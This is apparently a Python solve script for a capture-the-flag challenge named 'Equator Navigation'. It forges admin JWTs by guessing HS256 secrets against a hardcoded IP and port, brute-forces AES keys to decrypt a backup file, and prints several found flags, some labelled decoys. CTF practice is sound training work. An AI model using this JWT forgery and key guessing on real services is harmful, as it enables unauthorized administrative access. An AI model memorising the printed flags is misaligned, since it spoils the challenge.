#!/usr/bin/env python3
"""
Final comprehensive solve for Equator Navigation
"""

import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import pygeohash as pgh

TARGET_URL = "http://138.199.163.92:12973/"

def quick_jwt_test():
    """Quick test of most likely JWT secrets"""
    print("Testing JWT secrets...")
    
    session = requests.Session()
    
    # Most likely secrets based on challenge theme
    secrets = ["s000", "s0000", "nullisland", "geohash"]
    payload = {"role": "admin"}
    
    for secret in secrets:
        token = jwt.encode(payload, secret, algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        
        resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"[!!!] Found secret: {secret}")
            print(resp.text)
            return resp.text
    
    return None

def quick_decrypt_test():
    """Quick test of most likely AES keys"""
    print("\nTesting AES decryption...")
    
    with open('backup.bin', 'rb') as f:
        data = f.read()
    
    # Most likely keys
    key_strings = ["s000", "s0000", "nullisland", "geohash", "s00000000"]
    
    for key_str in key_strings:
        key = hashlib.sha256(key_str.encode()).digest()
        iv = b'\x00' * 16
        
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data)
            unpadded = unpad(decrypted, 16)
            text = unpadded.decode('utf-8', errors='ignore')
            
            if 'kaal{' in text.lower() or all(32 <= b < 127 for b in unpadded):
                print(f"[!!!] Decrypted with key: {key_str}")
                print(f"Text: {text}")
                return text
        except:
            pass
    
    return None

def check_all_flags():
    """Check all known flag locations"""
    print("\nChecking all flag locations...")
    
    session = requests.Session()
    
    urls = [
        TARGET_URL,
        TARGET_URL + 'flag.txt',
        TARGET_URL + 'robots.txt',
    ]
    
    for url in urls:
        resp = session.get(url)
        if 'kaal{' in resp.text.lower():
            import re
            flags = re.findall(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
            for flag in flags:
                print(f"Found: {flag} at {url}")

def main():
    print("="*60)
    print("Equator Navigation - Final Solve")
    print("="*60)
    print()
    
    # Check all known flags
    check_all_flags()
    
    # Quick JWT test
    result = quick_jwt_test()
    if result and 'kaal{' in result.lower():
        return
    
    # Quick decrypt test
    result = quick_decrypt_test()
    if result and 'kaal{' in result.lower():
        return
    
    print("\n" + "="*60)
    print("Summary of found flags:")
    print("1. Kaal{html_c0mm3nts_ar3_n0t_s3cur3} - HTML comment (decoy)")
    print("2. Kaal{r0b0ts_txt_l3d_m3_h3r3} - /flag.txt (decoy)")
    print("3. Kaal{r0b0ts_d0nt_k33p_s3cr3ts} - robots.txt (test flag)")
    print("\nReal flag likely in /admin or encrypted in backup.bin")
    print("Need to find correct JWT secret or AES key")
    print("="*60)

if __name__ == "__main__":
    main()
